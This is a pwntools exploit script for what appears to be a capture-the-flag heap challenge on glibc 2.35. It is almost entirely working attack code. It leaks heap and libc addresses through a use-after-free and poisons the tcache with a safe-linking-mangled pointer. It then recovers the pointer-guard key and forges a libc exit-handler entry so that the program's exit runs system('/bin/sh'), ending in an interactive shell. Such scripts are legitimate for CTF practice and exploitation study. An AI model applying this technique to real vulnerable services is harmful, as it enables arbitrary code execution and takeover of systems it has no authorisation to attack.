#!/usr/bin/python3 
from pwn import *

exe = ELF('./chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
ld = ELF('ld-2.35.so', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x0000000000001698
		brva 0x000000000000137E
		brva 0x000000000000135F
		brva 0x0000000000001821
		c
		''')

HOST = 'localhost'
PORT = 31337

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def create(idx, data):
	sla(b'choice: ', b'1')
	slan(b'(0-4): ', idx)
	sa(b'creation: ', data)
def update(idx, data):
	sla(b'choice: ', b'2')
	slan(b'(0-4): ', idx)
	sla(b'update: ', data)
def read(idx):
	sla(b'choice: ', b'3')
	slan(b'(0-4): ', idx)
def delete(idx):
	sla(b'choice: ', b'4')
	slan(b'(0-4): ', idx)
def rol(value, cnt): # rotate left => (value << n) | (value >> (64 - n))
	m_value = (value << cnt) & 0xffffffffffffffff
	m_tmp = value >> (64 - cnt)
	return (m_value | m_tmp)
def ror(value, cnt): # rotate right => (value >> n) | (value << (64 - n))
	m_value = value >> cnt
	m_tmp = value << (64 - cnt) & 0xffffffffffffffff
	return (m_value | m_tmp) 
#GDB()
input("Stage 1: Leak libc & leak ld")
create(0, b'A')
create(1, b'A')
delete(0)
read(0)
ru(b'data: ')
heap_base = leak(r(5)) << 12
info("heap base: ", heap_base)
update(0, p64(0))
for x in range(6): 
	delete(0)
	update(0, p64(0))
delete(0)
read(0)
ru(b'data: ')
libc.address = leak(r(6),0x21ace0)
info("libc base: ", libc.address)
input("Stage 2: overwrite __run_exit_handlers || overwrite initial")
offset_local = 0x22b000
offset_server = 0x22d000
ld.address = libc.address + offset_server
_dl_fini = ld.address + 0x6040
initial = libc.address + 0x21bf00
target = ((heap_base + 0x2a0) >> 12) ^ (initial)
update(0, p64(target))
create(2, b'A')
create(3, b'A' * 24)
read(3)
ru(b'A' * 24)
key = leak(r(8))
info("key: ", key)
pointerGuard = _dl_fini ^ ror(key, 0x11) #fs:0x30
system = rol(libc.sym.system ^ pointerGuard, 0x11)
payload = p64(0) + p64(1) # nxt = 
payload += p64(4) + p64(system) + p64(next(libc.search(b'/bin/sh')))
payload = payload.ljust(0xAF, b'\x00')
update(3, payload)
sla(b'choice: ', b'5')
p.interactive()

	